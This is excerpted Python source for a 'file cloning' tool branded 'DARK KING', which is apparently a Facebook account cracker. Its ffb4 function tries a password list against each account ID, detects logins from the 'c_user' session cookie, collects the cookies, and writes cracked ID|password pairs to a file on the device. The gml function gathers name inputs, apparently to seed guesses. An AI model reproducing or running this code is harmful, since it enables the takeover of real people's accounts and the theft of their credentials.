...
\033[1;32m │\33[37;41m\t     MR-N0OB FILE CLONING VERSION   \33[0;m  │
 \033[1;32m└──────────────────────────────────────────────┘
 \033[1;32m┌──────────────────────────────────────────────┐
 \033[1;32m |   🎭🎭              𝐃𝐀𝐑𝐊 𝐖𝐄𝐁 𝐂𝐘𝐁𝐄𝐑 𝐂𝐎𝐌𝐌𝐔𝐍𝐈𝐓𝐘             🎭🎭
 \033[1;32m┌────────────────────────────────────────────────┐
 ...
 \033[1;32m│\033[1;31m➣\033[1;32m GITHUB          \033[1;31m:\033[1;32m 𝐃𝐀𝐑𝐊𝐊𝐈𝐍𝐆𝐂𝐘𝐁𝐄𝐑𝟕𝟏
 \033[1;32m┌──────────────────────────────────────────────┐
 \033[1;32m |    🎭🎭             𝐃𝐀𝐑𝐊 𝐖𝐄𝐁 𝐂𝐘𝐁𝐄𝐑 𝐂𝐎𝐌𝐌𝐔𝐍𝐈𝐓𝐘               🎭🎭
 \033[1;32m└────────────────────────────────────────────────┘\n""")                                          
  ...
  try:
    ...
    if id in httpCaht:
      ...
      os.system(f'xdg-open {tan}://wa.me/+88018740281585?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
def ffb4(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆] %s | %s'%(ids,pas))
                                open(f'/sdcard/𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
...
def bd():
                ...
                print(' Total 𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆/Checkpoint: '+str(len(oks))+'/'+str(len(cps)))
...
def gml():
                ...
                clear()
                pcp.append(f'y')
                print('\033[1;32m Name  example:  𝐃𝐀𝐑𝐊 , 𝐊𝐈𝐍𝐆, 𝐅𝐫𝐞𝐞 ')
                code = input(' First name : ')
                print(' Name Example : 𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆, 𝐅𝐫𝐞𝐞, 𝐃𝐀𝐑𝐊 𝐖𝐄𝐁 ')
